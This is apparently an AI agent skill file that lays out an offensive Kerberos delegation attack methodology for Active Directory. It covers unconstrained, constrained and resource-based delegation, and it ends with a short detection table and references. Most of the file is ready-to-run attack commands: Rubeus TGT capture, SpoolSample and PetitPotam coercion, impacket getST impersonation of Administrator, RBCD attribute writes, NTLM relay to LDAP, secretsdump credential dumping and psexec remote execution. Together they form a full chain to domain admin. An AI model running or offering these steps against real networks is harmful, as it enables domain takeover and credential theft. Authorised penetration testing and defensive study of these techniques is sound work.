---
name: offensive-kerberos-delegation
description: "Kerberos delegation attack methodology — unconstrained delegation (TGT capture from coerced authentications), constrained delegation S4U2self/S4U2proxy abuse for impersonation, and Resource-Based Constrained Delegation (RBCD) where any GenericAll/GenericWrite on a target computer enables full impersonation. Use when BloodHound surfaces delegation paths or when GenericAll exists on a computer object."
---

# Kerberos Delegation Abuse

Three flavors of delegation, each with its own abuse:

1. **Unconstrained**: target stores a copy of the user's TGT — capturable
2. **Constrained**: target can request tickets on user's behalf to specified services
3. **Resource-Based Constrained (RBCD)**: target controls who can act on its behalf

## Unconstrained Delegation

### Find Hosts

```powershell
Get-DomainComputer -Unconstrained
Get-DomainController                       # DCs always have unconstrained
```

### Capture TGT

When a user authenticates to an unconstrained-delegation host, that host stores a copy of the user's TGT in memory.

```powershell
# On the unconstrained host (after foothold)
Rubeus.exe monitor /interval:5 /nowrap
# Watches for incoming TGTs every 5s
```

```bash
# Coerce a DC to authenticate to the unconstrained host
# (Requires the host to be reachable as an SMB-style target)
SpoolSample.exe dc.corp.local unconstrained-host.corp.local

# Then DC$ TGT lands at unconstrained-host
```

Captured TGT can be replayed for full DA-equivalent access.

## Constrained Delegation (S4U2self + S4U2proxy)

### Find

```powershell
Get-DomainUser -TrustedToAuth         # users with TRUSTED_TO_AUTH_FOR_DELEGATION
Get-DomainComputer -TrustedToAuth     # computers
```

### Abuse with NT Hash

```powershell
# Rubeus s4u — impersonate Administrator to allowed SPN
Rubeus.exe s4u /user:svc_acct /rc4:<NThash> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/dc.corp.local /ptt
```

```bash
# impacket equivalent
impacket-getST -spn cifs/dc.corp.local -impersonate Administrator \
  -dc-ip dc 'corp.local/svc_acct' -hashes :<NThash>

KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc.corp.local
```

### Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION)

When the account has the protocol transition flag, S4U2self yields a forwardable ticket — usable as Administrator without a password.

## Resource-Based Constrained Delegation (RBCD)

The target computer controls who can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. With GenericAll/GenericWrite on a computer object, you set this yourself.

### Set RBCD

```bash
# impacket-rbcd
impacket-rbcd -delegate-to victim_computer$ -delegate-from attacker -action write \
  corp.local/attacker:pass

# attacker can now S4U2self+S4U2proxy as any user toward victim_computer
```

### S4U Chain

```bash
# Get TGT for attacker (any account; including a computer account you created)
impacket-getTGT 'corp.local/attacker$:pass'

# S4U2self + S4U2proxy
KRB5CCNAME=attacker.ccache impacket-getST \
  -spn cifs/victim_computer.corp.local \
  -impersonate Administrator \
  -dc-ip dc 'corp.local/attacker$'

# Use the resulting Administrator-as-CIFS ticket
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass victim_computer.corp.local
```

### MachineAccountQuota

Default `ms-DS-MachineAccountQuota = 10` lets any domain user create up to 10 computer accounts. Combined with RBCD:

```bash
# Create a computer account
addcomputer.py -computer-name 'ATTACKER_PC' -computer-pass 'Pass123!' \
  corp.local/attacker:pass

# Use the computer account for RBCD attacks
```

## Coercion + RBCD = DA

```bash
# 1. Set up LDAP relay listener with --delegate-access
sudo impacket-ntlmrelayx -t ldaps://dc --delegate-access -wh attacker

# 2. Coerce a DC
PetitPotam.py attacker-ip dc.corp.local

# 3. Relay to LDAP — RBCD set on dc with attacker's computer account
# 4. S4U2self+S4U2proxy as Administrator → cifs/dc → DCSync
```

This is the canonical "PetitPotam → DA" chain.

## Detection

| Signal | Defender View |
|---|---|
| Computer account creation | DC event 4741 |
| msDS-AllowedToActOnBehalfOfOtherIdentity write | LDAP audit |
| S4U2self/S4U2proxy from non-DC | Kerberos event 4769 |
| Bulk delegation attempts | MDI primary detection |

## Engagement Cheatsheet

```bash
# 1. Map delegation paths
BloodHound: filter for AllowedToDelegate edges

# 2. Unconstrained: coerce + monitor
# 3. Constrained: S4U with NT hash if available
# 4. RBCD: write attribute, S4U as any user

# 5. Document: delegation type, source, target, impersonated user
```

## Key References

- "Wagging the Dog" (Elad Shamir) — RBCD canonical
- Rubeus s4u documentation
- "Trust... Then Verify" (Dirk-jan Mollema)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/delegation.md
